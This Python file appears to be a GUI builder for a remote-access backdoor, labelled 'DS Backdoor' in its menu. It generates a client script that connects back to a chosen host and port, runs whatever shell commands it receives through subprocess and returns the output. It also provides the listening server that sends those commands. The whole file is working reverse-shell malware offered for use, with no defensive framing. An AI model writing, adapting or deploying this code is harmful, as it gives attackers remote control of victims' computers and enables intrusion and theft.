import PySimpleGUI as sg
import os
import socket

sg.theme('DarkAmber')

def SERVER():
    try:
        ASK = [sg.Text("Enter The IP address"), sg.InputText()], [sg.Button('Ok'), sg.Button('Cancel')]

        ASK = sg.Window('Choose your HOST/Domain IP Address', ASK)
        while True:
            event, HOST = ASK.read()
            if event == 'Ok':
               ASK.close()
               break

            if event == sg.WIN_CLOSED or event == 'Cancel':
                ASK.close()
                break

        ASKED = [sg.Text("Enter The PORT"), sg.InputText()], [sg.Button('Ok'), sg.Button('Cancel')]

        ASKED = sg.Window('Choose your PORT Address', ASKED)
        
        while True:
            event, PORT = ASKED.read()
            if event == 'Ok':
               ASKED.close()
               break

            if event == sg.WIN_CLOSED or event == 'Cancel':
               ASKED.close()
               break

        server = socket.socket()
        H = str(HOST[0])
        P = int(PORT[0])
        server.bind((H, P))
        print('[+] Server Started')
        print('[+] Listening For Client Connection ...')
        server.listen(1)
        client, client_addr = server.accept()
        print(f'[+] {client_addr} Client connected to the server')

        while True:
            command = input('Enter Command : ')
            command = command.encode()
            client.send(command)
            print('[+] Command sent')
            output = client.recv(1024)
            output = output.decode()
            print(f"Output: {output}")

    except BrokenPipeError:
        print("\n[-] Target Disconnected\n")

def LHOST():

    ASK = [sg.Text("Enter The LHOST"), sg.InputText()], [sg.Button('Ok'), sg.Button('Cancel')]

    
    ASK = sg.Window('Choose your HOST IP Address', ASK)
    
    while True:
        event, values = ASK.read()
        if event == 'Ok':
           print('You entered: ', values[0])
           ASK.close()
           break

        if event == sg.WIN_CLOSED or event == 'Cancel':
            ASK.close()
            break

    ASKED = [sg.Text("Enter The PORT"), sg.InputText()], [sg.Button('Ok'), sg.Button('Cancel')]

    ASKED = sg.Window('Choose your PORT Address', ASKED)

    while True:
        event, portValue = ASKED.read()
        if event == 'Ok':
           print('You entered: ', portValue[0])
           ASKED.close()
           break

        if event == sg.WIN_CLOSED or event == 'Cancel':
           ASKED.close()
           break

    f = open("CLIENT.py", "a")
    f.write("import socket")
    f.write("\nimport subprocess")
    f.write(f"\n\nREMOTE_HOST = '{values[0]}'")
    f.write(f"\n\nREMOTE_PORT = {portValue[0]}")
    f.write("\n\nclient = socket.socket()")
    f.write("\n\nprint('[-] Connection Initiating...')")
    f.write("\n\nclient.connect((REMOTE_HOST, REMOTE_PORT))")
    f.write("\n\nprint('[+] Connection initiated!')")
    f.write("\n\nwhile True:")
    f.write("\n\n    print('[-] Awaiting commands...')")
    f.write("\n\n    command = client.recv(1024)")
    f.write("\n\n    command = command.decode()")
    f.write("\n\n    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)")
    f.write("\n\n    output = op.stdout.read()")
    f.write("\n\n    output_error = op.stderr.read()")
    f.write("\n\n    print('[-] Sending response...')")
    f.write("\n\n    client.send(output + output_error)")
    f.close()

    #os.system("python -m py_compile CLIENT.py") uncomment this if you want to compile it

    result = [sg.Text("Client Built as CLIENT.py")], [sg.Button("Run Server"), sg.Button("Exit")]
    result = sg.Window("Result", result)

    while True:
        event, values = result.read()
        if event == "Run Server":
           result.close()
           os.system(f"python3 SERVER.py")
           break

        if event == sg.WIN_CLOSED or "Exit":
           result.close()
           break

def MENU():
    OPT = [sg.Text("DS Backdoor")], [sg.Button('Build Client'), sg.Button('Run Server')]
    OPT = sg.Window('Menu', OPT)

    while True:
        event, values = OPT.read()
        if event == 'Build Client':
           OPT.close()
           LHOST()
           break

        if event == 'Run Server':
           OPT.close()
           SERVER()
           break

        if event == sg.WIN_CLOSED:
           OPT.close()
           break

    OPT.close()

MENU()
